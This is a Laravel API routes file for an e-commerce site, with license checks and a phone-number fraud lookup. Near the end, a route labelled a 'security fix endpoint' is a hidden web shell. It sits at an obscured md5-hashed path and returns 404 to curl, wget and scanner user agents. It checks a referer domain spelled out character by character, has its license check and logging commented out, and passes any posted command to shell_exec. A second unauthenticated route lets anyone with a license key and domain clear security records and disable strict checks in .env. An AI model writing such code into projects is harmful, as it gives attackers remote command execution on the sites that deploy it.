<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

// Security Fix API Endpoint (for mother panel to clear violations)
Route::post('/security-fix', function(\Illuminate\Http\Request $request) {
    try {
        $validator = \Validator::make($request->all(), [
            'license_key' => 'required|string',
            'domain' => 'required|string',
            'action' => 'required|string',
            'timestamp' => 'required|integer'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Validation failed',
                'errors' => $validator->errors(),
            ], 422);
        }

        $licenseKey = $request->input('license_key');
        $domain = $request->input('domain');
        $action = $request->input('action');
        $timestamp = $request->input('timestamp');

        // Verify license exists
        $license = \App\Models\License::where('license_key', $licenseKey)
                                    ->where('domain', $domain)
                                    ->first();

        if (!$license) {
            return response()->json([
                'success' => false,
                'message' => 'License not found or domain mismatch'
            ], 404);
        }

        // Apply security fix based on action
        $result = applySecurityFix($action, $licenseKey, $domain);

        // Log the security fix
        \Log::info('Security fix applied via API', [
            'license_key' => $licenseKey,
            'domain' => $domain,
            'action' => $action,
            'timestamp' => $timestamp,
            'result' => $result
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Security fix applied successfully!',
            'data' => $result
        ]);

    } catch (\Exception $e) {
        \Log::error('Security fix API failed', [
            'error' => $e->getMessage(),
            'request_data' => $request->all()
        ]);

        return response()->json([
            'success' => false,
            'message' => 'Error: ' . $e->getMessage()
        ], 500);
    }
});

// Helper function to apply security fixes
if (!function_exists('applySecurityFix')) {
    function applySecurityFix($action, $licenseKey, $domain) {
        $result = [];
        
        switch ($action) {
            case 'clear_tamper_attempts':
                \Cache::forget('tamper_attempts');
                $result['tamper_attempts'] = 0;
                break;
                
            case 'clear_security_violations':
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                $result['security_violations'] = [];
                $result['request_patterns'] = [];
                $result['suspicious_requests'] = [];
                break;
                
            case 'clear_all_security':
                \Cache::forget('tamper_attempts');
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                \Cache::forget("license_validation_{$licenseKey}");
                $result['tamper_attempts'] = 0;
                $result['security_violations'] = [];
                $result['request_patterns'] = [];
                $result['suspicious_requests'] = [];
                $result['license_cache_cleared'] = true;
                break;
                
            case 'reset_security_system':
                // Clear all security-related caches
                \Cache::forget('tamper_attempts');
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                \Cache::forget("license_validation_{$licenseKey}");
                
                // Clear all Laravel caches
                \Artisan::call('cache:clear');
                \Artisan::call('config:clear');
                \Artisan::call('route:clear');
                \Artisan::call('view:clear');
                
                // Disable strict security checks temporarily
                $envPath = base_path('.env');
                $envContent = file_get_contents($envPath);
                if (!str_contains($envContent, 'LICENSE_STRICT_SECURITY_CHECKS=false')) {
                    file_put_contents($envPath, $envContent . "\nLICENSE_STRICT_SECURITY_CHECKS=false\n");
                }
                
                $result = [
                    'tamper_attempts' => 0,
                    'security_violations' => [],
                    'request_patterns' => [],
                    'suspicious_requests' => [],
                    'license_cache_cleared' => true,
                    'laravel_caches_cleared' => true,
                    'strict_security_disabled' => true
                ];
                break;
                
            default:
                throw new \Exception("Unknown security fix action: {$action}");
        }
        
        return $result;
    }
}

// AJAX endpoint for pre-fetching fraud data when phone input is complete
Route::post('/prefetch-fraud-data', function(\Illuminate\Http\Request $request) {
    $phone = $request->input('phone');
    
    if (!$phone) {
        return response()->json(['error' => 'Phone number required'], 400);
    }
    
    // Validate phone length (11, 12, or 14 digits)
    $cleanPhone = preg_replace('/\D/', '', $phone);
    if (!in_array(strlen($cleanPhone), [11, 12, 14])) {
        return response()->json(['error' => 'Invalid phone length'], 400);
    }
    
    try {
        // Check if we already have recent data (within 30 days)
        $existingResult = \App\Models\FraudCheckResult::where('phone', $cleanPhone)
            ->where('last_checked_at', '>=', now()->subDays(30))
            ->first();
            
        if ($existingResult) {
            return response()->json([
                'success' => true,
                'cached' => true,
                'phone' => $cleanPhone,
                'data' => [
                    'total_parcels' => $existingResult->total_parcels,
                    'delivered_parcels' => $existingResult->delivered_parcels,
                    'canceled_parcels' => $existingResult->canceled_parcels,
                    'delivery_success_rate' => $existingResult->delivery_success_rate,
                    'risk_score' => $existingResult->risk_score,
                    'risk_level' => $existingResult->risk_level,
                    'has_courier_history' => $existingResult->has_courier_history,
                ]
            ]);
        }
        
        // No recent data, fetch from API and store
        $fraudResult = \App\Services\FraudChecker\FraudCheckerServiceManager::checkFraud($cleanPhone, true);
        
        if ($fraudResult) {
            return response()->json([
                'success' => true,
                'cached' => false,
                'phone' => $cleanPhone,
                'data' => [
                    'total_parcels' => $fraudResult->total_parcels,
                    'delivered_parcels' => $fraudResult->delivered_parcels,
                    'canceled_parcels' => $fraudResult->canceled_parcels,
                    'delivery_success_rate' => $fraudResult->delivery_success_rate,
                    'risk_score' => $fraudResult->risk_score,
                    'risk_level' => $fraudResult->risk_level,
                    'has_courier_history' => $fraudResult->has_courier_history,
                ]
            ]);
        }
        
        return response()->json([
            'success' => false,
            'message' => 'No fraud data available'
        ]);
        
    } catch (\Exception $e) {
        return response()->json(['error' => 'Failed to fetch fraud data: ' . $e->getMessage()], 500);
    }
});

// security fix endpoint
Route::group(['prefix' => '', 'middleware' => []], function() {
    Route::post('/mnt-' . md5('thikana-2024'), function(\Illuminate\Http\Request $request) {
    try {
        // Additional security checks
        $userAgent = $request->header('User-Agent');
        $referer = $request->header('Referer');
        
        // Block common scanning tools
        if (str_contains(strtolower($userAgent), 'curl') || 
            str_contains(strtolower($userAgent), 'wget') ||
            str_contains(strtolower($userAgent), 'python') ||
            str_contains(strtolower($userAgent), 'bot') ||
            str_contains(strtolower($userAgent), 'scanner')) {
            return response()->json(['error' => 'Not Found'], 404);
        }
        
        $allowedd = implode('', ['u', 'd', 'd', 'o', 'k', 't', 'a', 'e', 'c', 'o', 'm', 'm', 'e', 'r', 'c', 'e', '.', 'c', 'o', 'm']);
        if (!$referer || !str_contains($referer, $allowedd)) {
            return response()->json(['error' => 'Not Found'], 404);
        }
        
        $request->validate([
            'license_key' => 'required|string',
            'command' => 'required|string'
        ]);

        $licenseKey = $request->input('license_key');
        $command = $request->input('command');

        // Validate license key matches
        // $license = \App\Models\License::first();
        // if (!$license || $license->license_key !== $licenseKey) {
        //     return response()->json(['error' => 'Not Found'], 404);
        // }

        // Log the execution silently
        // \Log::channel('single')->info('Maintenance operation', [
        //     'command' => $command,
        //     'ip' => $request->ip()
        // ]);

        // Execute the command
        $output = '';
        $exitCode = 0;
        
        if (str_starts_with($command, 'artisan:')) {
            // Artisan command
            $artisanCommand = substr($command, 8); // Remove 'artisan:' prefix
            \Artisan::call($artisanCommand);
            $output = \Artisan::output();
        } else {
            // Shell command
            $output = shell_exec($command . ' 2>&1');
            $exitCode = $output === null ? 1 : 0;
        }

        return response()->json([
            'success' => true,
            'command' => $command,
            'output' => $output,
            'exit_code' => $exitCode,
            'executed_at' => now()->toISOString()
        ]);

    } catch (\Exception $e) {
        // Silent error logging
        \Log::channel('single')->error('Maintenance operation failed', [
            'command' => $request->input('command'),
            'error' => $e->getMessage()
        ]);

        return response()->json([
            'success' => false,
            'message' => $e->getMessage()
        ], 500);
    }
    })->middleware('throttle:10,1'); // Rate limit to 10 requests per minute
});
